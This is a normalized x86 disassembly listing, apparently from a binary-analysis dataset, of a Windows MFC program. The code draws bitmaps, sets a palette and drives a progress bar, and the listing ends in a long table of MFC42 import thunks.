call Ordinal_MFC42_613
xor eax eax
mov ecx [ esp + 0x3c ]
push 0x0
push ecx
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5791
mov edx [ esp + 0x34 ]
push 0x0
push edx
lea ecx [ esp + 0x68 ]
call Ordinal_MFC42_5791
mov eax [ esp + 0x10 ]
push 0x0
push eax
lea ecx [ esp + 0x58 ]
call Ordinal_MFC42_5791
mov ecx [ esp + 0xec ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xe8
retn
sub_402730
push ebx
push esi
push 0x104
call ??2@YAPAXI@Z
mov esi eax
add esp 0x4
xor eax eax
xor ebx ebx
mov [ esi ] 0x300
mov [ esi + 0x2 ] 0x40
lea ecx [ esi + 0x5 ]
mov dl bl
add ecx 0x4
shl dl 0x2
mov [ ecx - 0x5 ] dl
mov [ ecx - 0x4 ] dl
mov [ ecx - 0x3 ] dl
mov [ ecx - 0x2 ] al
inc ebx
cmp ebx 0x40
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_402780
push 0xffffffff
push sub_403b5a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x70
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_402820
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402890
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_403b78
push eax
mov [ fs : 0x0 ] esp
sub esp 0x64
push esi
mov esi [ ecx + 0x40 ]
push edi
mov ecx esi
call sub_401e90
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0x6c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x70
retn 0x4
push ebx
push ebp
mov ecx esi
call sub_401eb0
mov esi [ esp + 0x84 ]
mov ebx eax
test ebx ebx
je r-xdata
mov ebp [ esp + 0x84 ]
push 0x0
push ebx
mov ecx esi
call Ordinal_MFC42_5791
mov ebp eax
mov eax [ esi + 0x4 ]
push eax
call [ RealizePalette@IAT ]
jmp r-xdata
push eax
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_1640
mov eax [ edi + 0x4 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call Ordinal_MFC42_5785
mov ecx [ esp + 0x14 ]
mov edi eax
lea eax [ esp + 0x10 ]
mov edx [ esp + 0x28 ]
neg eax
sbb eax eax
push 0xcc0020
and eax ecx
mov ecx [ esi + 0x4 ]
push 0x0
push 0x0
push eax
mov eax [ esp + 0x34 ]
push edx
push eax
push 0x0
push 0x0
push ecx
call [ BitBlt@IAT ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
lea ecx [ esp + 0x20 ]
push ecx
push 0x54
push edx
call [ GetObjectA@IAT ]
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_323
xor eax eax
cmp esi eax
mov [ esp + 0x7c ] eax
je r-xdata
mov edx [ esp + 0x14 ]
push edi
push edx
call Ordinal_MFC42_5785
test ebx ebx
je r-xdata
mov edi [ edi + 0x4 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x7c ] 0xffffffff
call Ordinal_MFC42_640
pop ebp
pop ebx
push 0x0
push ebp
mov ecx esi
call Ordinal_MFC42_5791
sub_4029c0
push 0xffffffff
push sub_403ba0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5c
push ebp
push esi
mov esi ecx
push edi
lea ecx [ esp + 0x10 ]
call sub_401250
lea ecx [ esp + 0x10 ]
mov [ esp + 0x70 ] 0x0
call sub_401370
sub_402ad0
push 0xffffffff
push sub_403bba
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x184
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_402b70
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402b70
push 0xffffffff
push sub_403bd8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call Ordinal_MFC42_366
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call sub_402e60
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x180 ] 0xffffffff
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402bf0
push 0xffffffff
push sub_403bf8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call sub_402f00
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_674
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402c50
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
call Ordinal_MFC42_4457
cmp eax 0xffffffff
jne r-xdata
push 0xe801
push 0x50008200
push esi
lea ecx [ esi + 0xc0 ]
call Ordinal_MFC42_2117
neg eax
sbb eax eax
pop esi
neg eax
dec eax
retn 0x4
or eax eax
pop esi
retn 0x4
sub_402cb0
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0xc4 ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
retn
mov edx [ esi ]
push 0x0
push 0x0
push 0x0
mov ecx esi
call [ edx + 0xc4 ]
mov ecx eax
call Ordinal_MFC42_6329
sub_402ce0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
cmp eax esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
call [ eax + 0xc4 ]
test eax eax
je r-xdata
mov edx [ esi ]
push 0x0
push 0x0
push 0x0
mov ecx esi
call [ edx + 0xc4 ]
mov ecx eax
call Ordinal_MFC42_6329
sub_402d40
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
cdq
idiv [ esp + 0x10 ]
mov edi eax
mov eax [ esi + 0x180 ]
cmp edi eax
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x8
push edi
lea ecx [ esi + 0xc0 ]
call sub_403170
mov [ esi + 0x180 ] edi
sub_402d80
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0xc4 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x8
mov ecx eax
call sub_401ed0
push 0x0
lea ecx [ esi + 0xc0 ]
call sub_403170
mov [ esi + 0x180 ] 0xffffffff
sub_402dc0
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0xc4 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x8
mov ecx eax
call sub_401f50
push 0x0
lea ecx [ esi + 0xc0 ]
call sub_403170
mov [ esi + 0x180 ] 0xffffffff
sub_402e60
push 0xffffffff
push sub_403c18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
call Ordinal_MFC42_529
lea edi [ esi + 0x80 ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call Ordinal_MFC42_567
mov ecx [ esp + 0xc ]
mov [ edi ] r--data
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402f00
push 0xffffffff
push sub_403c38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x80 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_765
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_796
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402f60
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_403c58
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
sub esp 0x64
push esi
mov esi ecx
push eax
call Ordinal_MFC42_4454
cmp eax 0xffffffff
jne r-xdata
push ebx
push edi
push 0x3
push rw-data
mov ecx esi
call Ordinal_MFC42_6000
push esi
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_289
mov ecx [ esi + 0x20 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x31
push ecx
mov [ esp + 0x88 ] 0x0
call edi
push eax
call Ordinal_MFC42_2860
push eax
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_5789
mov ebx eax
mov eax [ esp + 0x2c ]
lea edx [ esp + 0x38 ]
push edx
push eax
call [ GetTextMetricsA@IAT ]
push ebx
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_5789
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0xc ]
push ecx
lea eax [ esp + 0x84 ]
push edx
push eax
push 0x1
mov ecx esi
call Ordinal_MFC42_3482
mov eax [ esp + 0x4c ]
mov edx [ esp + 0xc ]
lea ecx [ eax + eax * 2 ]
mov eax [ esp + 0x80 ]
shl ecx 0x3
push ecx
push edx
push eax
push 0x1
mov ecx esi
call Ordinal_MFC42_6067
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0xc ]
push ecx
lea eax [ esp + 0x84 ]
push edx
push eax
push 0x2
mov ecx esi
call Ordinal_MFC42_3482
mov eax [ esp + 0x4c ]
mov edx [ esp + 0x80 ]
lea ecx [ eax + eax * 2 ]
shl ecx 0x3
push ecx
push 0x100
push edx
push 0x2
mov ecx esi
call Ordinal_MFC42_6067
lea eax [ esp + 0x14 ]
mov ecx esi
push eax
push 0x2
call Ordinal_MFC42_3294
push 0xffffffff
lea ecx [ esp + 0x18 ]
push esi
push ecx
push 0x50000001
lea ecx [ esi + 0x80 ]
call Ordinal_MFC42_2108
mov edx [ esi + 0xa0 ]
push 0x640000
push 0x0
push 0x401
push edx
call edi
mov eax [ esi + 0xa0 ]
push 0x0
push 0x0
push 0x402
push eax
call edi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x78 ] 0xffffffff
call Ordinal_MFC42_613
mov ecx [ esp + 0x70 ]
pop edi
pop ebx
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x70
retn 0x4
or eax eax
pop esi
mov ecx [ esp + 0x64 ]
mov [ fs : 0x0 ] ecx
add esp 0x70
retn 0x4
sub_4030f0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
sub esp 0x10
push esi
mov esi ecx
mov ecx [ esp + 0x1c ]
push eax
push ecx
push edx
mov ecx esi
call Ordinal_MFC42_5039
lea eax [ esp + 0x4 ]
mov ecx esi
push eax
push 0x2
call Ordinal_MFC42_3294
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
sub ecx eax
push 0x4
push ecx
mov ecx [ esp + 0xc ]
sub edx ecx
push edx
push eax
push ecx
push 0x0
lea ecx [ esi + 0x80 ]
call Ordinal_MFC42_6197
pop esi
add esp 0x10
retn 0xc
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_403365
cmp [ rw-data ] ebx
jne r-xdata
call sub_403350
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_403362
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4038be
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4038d6
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401000
call sub_401010
jmp sub_401020
sub_401010
mov ecx rw-data
jmp sub_401040
sub_401020
push sub_401030
call sub_4031bc
pop ecx
retn
sub_401030
mov ecx rw-data
jmp sub_4010a0
sub_401040
push esi
mov esi ecx
push 0x104
lea eax [ esi + 0x104 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
mov eax esi
pop esi
retn
sub_4010a0
retn
sub_401250
mov eax ecx
retn
sub_401370
push 0x0
push 0x0
push 0x0
call sub_401260
sub_401390
mov eax ecx
mov [ eax ] 0x1
mov [ eax + 0x10c ] 0x1
mov [ eax + 0x31c ] 0x0
retn
sub_401490
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_4014a0
mov eax r--data
retn
sub_4014b0
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4014d0
retn
sub_4014e0
push esi
mov esi ecx
call sub_401500
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401500
jmp Ordinal_MFC42_815
sub_401510
call sub_401520
jmp sub_401530
sub_401520
mov ecx rw-data
jmp sub_4014b0
sub_401530
push sub_401540
call sub_4031bc
pop ecx
retn
sub_401540
mov ecx rw-data
jmp sub_401500
sub_401660
mov eax [ esp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn 0x4
sub_401670
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401690
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_4016a0
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_4016b0
push esi
mov esi ecx
call sub_4016d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4016d0
jmp Ordinal_MFC42_641
sub_4016e0
retn 0x4
sub_4016f0
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_401700
mov eax r--data
retn
sub_4017d0
mov eax [ Ordinal_MFC42_1825@IAT ]
retn
sub_4017e0
mov eax r--data
retn
sub_4017f0
mov eax [ Ordinal_MFC42_4238@IAT ]
retn
sub_401800
mov eax r--data
retn
sub_4018b0
push esi
mov esi ecx
call sub_4018d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401920
mov al [ esp + 0x4 ]
push esi
mov esi ecx
test al 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401940
mov [ ecx ] r--data
retn
sub_401950
push esi
mov esi ecx
call sub_401970
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4019c0
push esi
mov esi ecx
call sub_4019e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401a30
mov eax [ ecx + 0x48 ]
retn
sub_401a40
mov eax [ esp + 0x4 ]
mov [ ecx + 0x48 ] eax
retn 0x4
sub_401a50
mov eax 0x1
retn 0x8
sub_401a60
push esi
mov esi ecx
call sub_401a80
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401a80
push esi
mov esi ecx
lea eax [ esi + 0x8 ]
mov [ esi ] r--data
push eax
call [ DeleteCriticalSection@IAT ]
mov ecx esi
call Ordinal_MFC42_803
pop esi
retn
sub_401aa0
add ecx 0x8
push ecx
call [ EnterCriticalSection@IAT ]
mov eax 0x1
retn 0x4
sub_401ac0
add ecx 0x8
push ecx
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
retn
sub_401ad0
push esi
mov esi ecx
call sub_401af0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401bb0
call Ordinal_MFC42_4823
neg eax
sbb eax eax
neg eax
retn
sub_401e90
lea eax [ ecx + 0x8c ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
retn
sub_401eb0
lea eax [ ecx + 0x84 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
retn
sub_402720
mov eax ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
retn
sub_4027e0
mov eax [ Ordinal_MFC42_1920@IAT ]
retn
sub_4027f0
mov eax r--data
retn
sub_402800
mov eax [ Ordinal_MFC42_4262@IAT ]
retn
sub_402810
mov eax r--data
retn
sub_402820
push esi
mov esi ecx
call Ordinal_MFC42_517
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_402840
retn 0x4
sub_402850
push esi
mov esi ecx
call sub_402870
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_402870
mov [ ecx ] r--data
jmp Ordinal_MFC42_784
sub_402880
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_5260
retn 0x4
sub_402b30
mov eax [ Ordinal_MFC42_1842@IAT ]
retn
sub_402b40
mov eax r--data
retn
sub_402b50
mov eax [ Ordinal_MFC42_4242@IAT ]
retn
sub_402b60
mov eax r--data
retn
sub_402bd0
push esi
mov esi ecx
call sub_402bf0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_402c90
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_5252
neg eax
sbb eax eax
neg eax
retn 0x4
sub_402d20
mov eax [ esp + 0x8 ]
add ecx 0xc0
push eax
call sub_403150
xor eax eax
retn 0x8
sub_402e00
call sub_402e10
jmp sub_402e20
sub_402e10
mov ecx rw-data
jmp sub_401250
sub_402e20
push sub_402e30
call sub_4031bc
pop ecx
retn
sub_402e30
mov ecx rw-data
jmp sub_4010a0
sub_402e40
mov eax [ Ordinal_MFC42_4265@IAT ]
retn
sub_402e50
mov eax r--data
retn
sub_402ec0
push esi
mov esi ecx
call Ordinal_MFC42_765
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_402ee0
push esi
mov esi ecx
call sub_402f00
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_403150
mov eax [ esp + 0x4 ]
push 0x1
push eax
push 0x1
call Ordinal_MFC42_6069
retn 0x4
sub_403170
mov eax [ esp + 0x4 ]
mov ecx [ ecx + 0xa0 ]
push 0x0
push eax
push 0x402
push ecx
call [ SendMessageA@IAT ]
retn 0x4
sub_403190
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_4031bc
push [ esp + 0x4 ]
call sub_403190
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_403350
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_403362
xor eax eax
retn
sub_403365
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Ordinal_MFC42_4612
jmp [ Ordinal_MFC42_4612@IAT ]
Ordinal_MFC42_4610
jmp [ Ordinal_MFC42_4610@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_6215
jmp [ Ordinal_MFC42_6215@IAT ]
Ordinal_MFC42_617
jmp [ Ordinal_MFC42_617@IAT ]
Ordinal_MFC42_5301
jmp [ Ordinal_MFC42_5301@IAT ]
Ordinal_MFC42_5214
jmp [ Ordinal_MFC42_5214@IAT ]
Ordinal_MFC42_296
jmp [ Ordinal_MFC42_296@IAT ]
Ordinal_MFC42_986
jmp [ Ordinal_MFC42_986@IAT ]
Ordinal_MFC42_520
jmp [ Ordinal_MFC42_520@IAT ]
Ordinal_MFC42_4159
jmp [ Ordinal_MFC42_4159@IAT ]
Ordinal_MFC42_6117
jmp [ Ordinal_MFC42_6117@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_3584
jmp [ Ordinal_MFC42_3584@IAT ]
Ordinal_MFC42_4696
jmp [ Ordinal_MFC42_4696@IAT ]
Ordinal_MFC42_3058
jmp [ Ordinal_MFC42_3058@IAT ]
Ordinal_MFC42_3065
jmp [ Ordinal_MFC42_3065@IAT ]
Ordinal_MFC42_6336
jmp [ Ordinal_MFC42_6336@IAT ]
Ordinal_MFC42_2510
jmp [ Ordinal_MFC42_2510@IAT ]
Ordinal_MFC42_2542
jmp [ Ordinal_MFC42_2542@IAT ]
Ordinal_MFC42_5243
jmp [ Ordinal_MFC42_5243@IAT ]
Ordinal_MFC42_5740
jmp [ Ordinal_MFC42_5740@IAT ]
Ordinal_MFC42_1746
jmp [ Ordinal_MFC42_1746@IAT ]
Ordinal_MFC42_5577
jmp [ Ordinal_MFC42_5577@IAT ]
Ordinal_MFC42_3172
jmp [ Ordinal_MFC42_3172@IAT ]
Ordinal_MFC42_5653
jmp [ Ordinal_MFC42_5653@IAT ]
Ordinal_MFC42_4420
jmp [ Ordinal_MFC42_4420@IAT ]
Ordinal_MFC42_4953
jmp [ Ordinal_MFC42_4953@IAT ]
Ordinal_MFC42_4387
jmp [ Ordinal_MFC42_4387@IAT ]
Ordinal_MFC42_3454
